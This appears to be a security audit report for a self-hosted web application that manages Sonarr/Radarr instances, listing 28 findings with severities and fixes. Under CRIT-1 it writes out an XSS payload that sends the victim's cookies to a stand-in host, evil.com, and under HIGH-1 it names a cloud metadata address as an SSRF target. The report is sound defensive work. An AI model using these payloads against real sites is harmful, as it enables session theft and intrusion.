# Security Assessment Report

**Date:** 2026-02-27
**Scope:** Full codebase (main branch, post-TOTP merge)
**Method:** Automated tooling (Bandit, Safety, pytest security suite) + manual red-team code review across 4 domains (auth/JWT/TOTP, API/SSRF/injection, frontend/XSS/CSP, best practices research)

---

## Executive Summary

28 findings across 4 severity levels. The application has a solid security foundation (Argon2id, SQLCipher, JWT algorithm whitelisting, nonce-based CSP, httpOnly cookies), but several gaps exist in defense-in-depth layers, particularly around TOTP implementation, innerHTML usage, rate limiting configuration, and SSRF validation consistency.

**By severity:** 3 Critical, 8 High, 7 Medium, 10 Low/Info

---

## Critical Findings

### CRIT-1: Stored XSS via innerHTML with Unsanitized API Response Data
**Files:** `templates/dashboard/instances.html:264-279`, `templates/setup/instance.html:137-167`

API response fields (`data.version`, `data.instance_info`, `data.message`, `error.message`) from Sonarr/Radarr connection tests are interpolated directly into `innerHTML` template literals without HTML encoding. A malicious or compromised Sonarr/Radarr instance could inject `<img src=x onerror="...">` payloads. Event handler attributes bypass the nonce-based CSP because nonces only guard `<script>` elements.

**Attack:** Register a Sonarr instance returning `<img src=x onerror="document.location='https://evil.com/?c='+document.cookie">` as its version string. When admin tests connection, XSS fires.

**Fix:** Replace all `innerHTML` assignments containing API data with DOM methods using `textContent`, or apply an `escapeHtml()` utility.

### CRIT-2: TOTP Has No Replay Protection
**File:** `core/auth.py:636`, `api/auth.py:765,700,863`

`verify_totp_code()` accepts any code within the `valid_window=1` (90-second) period with no tracking of previously used codes. An attacker who observes a valid code (shoulder surfing, phishing, MITM) can replay it within the window.

**Fix:** Add `totp_last_used_at` column to User model. After successful TOTP verification, record the timestamp and reject codes from the same or earlier time window.

### CRIT-3: Raw Exception Text Leaked in HTTP Error Responses
**Files:** `api/instances.py:491,764,900`, `api/search_queue.py:133,509`, `main.py:319`

Multiple exception handlers embed `str(e)` directly in JSON response `detail` fields. SQLAlchemy, httpx, and socket exceptions expose table names, connection strings, and internal host addresses. Additionally, the `validation_error_handler` in `main.py:319` crashes with `TypeError: Object of type bytes is not JSON serializable` when `exc.errors()` contains `bytes` values (confirmed in security test logs), potentially causing 500 errors that bypass error handling entirely.

**Fix:** Use generic error messages in all 4xx/5xx responses. The raw exception is already logged server-side by structlog.

---

## High Findings

### HIGH-1: InstanceUpdate URL Bypasses SSRF Validation
**Files:** `schemas/instance.py` (InstanceUpdate class), `api/instances.py:375-376`

`InstanceCreate` has a `@field_validator("url")` calling `validate_instance_url()`. `InstanceUpdate` has no such validator. An attacker can update an existing instance URL to `http://169.254.169.254/` and trigger a connection test to achieve SSRF.

**Fix:** Add the same `@field_validator("url")` to `InstanceUpdate`.

### HIGH-2: Rate Limiter Key Uses Proxy IP in Production
**Files:** `main.py:44-45`, `api/auth.py:60`

`key_func=get_remote_address` reads `request.client.host`, which is the reverse proxy IP in production. All users share one rate limit bucket behind a proxy, enabling both DoS of legitimate users and bypass by distributed attackers.

**Fix:** Create a custom key function that reads `X-Forwarded-For` in production, matching the existing `get_client_ip()` logic.

### HIGH-3: 2FA Pending Token Not Blacklisted After Use
**File:** `api/auth.py:784-785`

After successful TOTP verification, the `2fa_pending_token` cookie is deleted client-side, but the JWT is not invalidated server-side. An attacker who captured the cookie can replay it within the 5-minute window.

**Fix:** Blacklist the pending token's JTI after successful use, similar to the access token blacklist.

### HIGH-4: Password Change Doesn't Blacklist Current Access Token
**File:** `api/auth.py:936-961`

On password change, refresh tokens are revoked but the current access token remains valid for up to 15 minutes. A stolen access token retains full access even after the victim changes their password.

**Fix:** Call `blacklist_access_token(access_token)` after `revoke_all_user_tokens()`.

### HIGH-5: `follow_redirects=True` Forwards X-Api-Key to Redirect Destinations
**Files:** `services/sonarr.py:147`, `services/radarr.py:147`

httpx does NOT strip custom headers like `X-Api-Key` on cross-origin redirects (only strips `Authorization`). A misconfigured Sonarr/Radarr instance that redirects could leak the API key to a third party.

**Fix:** Set `follow_redirects=False`, or implement custom auth flow that only sets the key on same-origin requests.

### HIGH-6: No Per-Account Lockout on TOTP Failures
**File:** `api/auth.py:721-807`

The `/api/auth/2fa/login-verify` endpoint has IP rate limiting (5/min) but no per-account lockout. Distributed attackers using rotating proxies get effectively unlimited attempts. The password phase has `increment_failed_login` but the TOTP phase does not.

**Fix:** Reuse the `increment_failed_login` / `is_locked` mechanism for failed TOTP attempts.

### HIGH-7: `disable_2fa` Endpoint Has No Rate Limiting
**File:** `api/auth.py:816-876`

No `@limiter.limit` decorator and no `increment_failed_login()` on password mismatch. An attacker with a stolen access token can make unlimited password guesses through this endpoint.

**Fix:** Add `@limiter.limit("3/minute")` and call `increment_failed_login()` on password failure.

### HIGH-8: History Cleanup Deletes Records Across All Users
**File:** `api/search_history.py:199-232`

`DELETE /api/search-history` is authenticated but the underlying `cleanup_old_history(days=days)` has no user-scoping. Any authenticated user can delete all users' search history.

**Fix:** Pass `user_id=current_user.id` to the cleanup service and enforce it in the query.

---

## Medium Findings

### MED-1: Missing `object-src` and `Permissions-Policy` Headers
**File:** `main.py:156-167`

CSP is missing `object-src 'none'` (allows `<object>`/`<embed>` from self). No `Permissions-Policy` header to deny camera/microphone/geolocation access.

### MED-2: `style-src 'unsafe-inline'` in CSP
**File:** `main.py:159`

Required by Pico CSS but enables CSS injection attacks that can amplify XSS findings.

### MED-3: Username Enumeration via Timing Side-Channel
**File:** `core/auth.py:527-533`

Locked accounts return in ~1ms (skips Argon2), while invalid passwords take ~500-2000ms. Attackers can enumerate locked accounts via response timing.

**Fix:** Add dummy `verify_password("dummy", DUMMY_PASSWORD_HASH)` call before raising for locked accounts.

### MED-4: `expose_headers: ["*"]` in CORS Configuration
**File:** `main.py:93`

Exposes all response headers to cross-origin JavaScript. Should be restricted to only needed headers.

### MED-5: Validation Error Handler Crashes on Bytes Input
**File:** `main.py:319`

`exc.errors()` can contain `bytes` values (e.g., form-urlencoded body), causing `TypeError: Object of type bytes is not JSON serializable` in the JSON response. This bypasses error handling and returns a raw 500 error.

**Fix:** Serialize validation errors with a custom encoder that handles bytes.

### MED-6: Setup Admin Form Missing Rate Limit and Uses `elif` Chain
**File:** `api/dashboard.py:213-334`

No `@limiter.limit` on the setup form. Password validation uses `elif` chain (reports one error at a time instead of all). Missing common-password blocklist that the JSON API enforces.

### MED-7: `algorithm` Config Field Unused — Creates False Assurance
**File:** `config.py:60-63`

The `algorithm` setting is configurable but silently ignored — JWT always uses hardcoded `HS256`. An operator setting `ALGORITHM=RS256` gets no effect and no warning.

**Fix:** Remove the field or add a validator constraining it.

---

## Low / Informational Findings

### LOW-1: `2fa_pending_token` Cookie Path Too Broad (`/`)
Should be scoped to `path="/api/auth"`.

### LOW-2: `X-XSS-Protection` Header is Deprecated
`X-XSS-Protection: 1; mode=block` is removed from modern browsers and can introduce its own vulnerabilities. The nonce-based CSP is the correct replacement. Remove this header.

### LOW-3: Setup Form Doesn't Validate Username Format
The HTML form path accepts any username (no regex validation), unlike the JSON API.

### LOW-4: TOTP Secret Stored Without Application-Level Encryption
`totp_secret` is a plain `String(32)` column — unlike API keys which use `encrypt_field()`. SQLCipher provides whole-DB encryption, but Fernet would add defense against SQL injection data exfiltration.

### LOW-5: Dashboard `instance_type` Not Validated Against Allowlist
**File:** `api/dashboard.py:611` — accepts arbitrary `instance_type` from form input.

### LOW-6: Unbounded `limit` Parameter on `/api/dashboard/activity`
No upper bound — should use `Query(10, ge=1, le=100)`.

### LOW-7: `ecdsa` Dependency Has Known Side-Channel CVEs
`ecdsa 0.19.1` has CVE-2024-23342 (Minerva timing attack). Not directly used by the application but pulled in as a transitive dependency.

### LOW-8: In-Memory Token Blacklist Cleared on Restart
Revoked access tokens become temporarily valid again after container restart (up to 15 minutes). Documented as known limitation.

### LOW-9: `TrustedHostMiddleware` Only Enforced in Production
Host header injection possible in development/test environments.

### LOW-10: HSTS Header Missing `preload` Directive
Minor for homelab but noted for completeness.

---

## Dependency Vulnerabilities

| Package | Version | CVE | Severity | Status |
|---------|---------|-----|----------|--------|
| ecdsa | 0.19.1 | CVE-2024-23342 | Medium | Transitive dep, not directly used |
| PyJWT | Check | CVE-2024-53861 | Low (2.2) | Issuer partial match — verify version >= 2.10.1 |

---

## Automated Tool Results

- **Bandit:** 2 medium (expected: 0.0.0.0 binding), 13 low (all false positives — schema examples)
- **Safety:** 2 vulnerabilities in `ecdsa 0.19.1` (transitive dependency)
- **Security tests:** 28 failures, 69 passes — failures are pre-existing DB isolation issues in test infrastructure, not production vulnerabilities

---

## What's Done Well

- JWT algorithm confusion prevented (`ALLOWED_JWT_ALGORITHMS = ["HS256"]`, header double-checked)
- Token type confusion prevented (type claim verified in every decode path)
- Argon2id parameters above OWASP minimums (128 MiB memory, 3 iterations, 8 parallelism)
- Pepper applied via HMAC-SHA256 before Argon2id, minimum 32 bytes enforced
- Timing equalization for non-existent users (dummy Argon2 hash)
- httpOnly, Secure, SameSite=Strict on all auth cookies
- Refresh token rotation with atomic revocation
- Nonce-based CSP on all inline scripts (cryptographically random, per-request)
- No `| safe` or `Markup()` usage anywhere in templates
- `frame-ancestors 'none'` + `X-Frame-Options: DENY` for clickjacking protection
- `base-uri 'self'` and `form-action 'self'` in CSP
- SSRF protection with private IP range blocking
- Secret key minimum length enforcement (32 bytes)
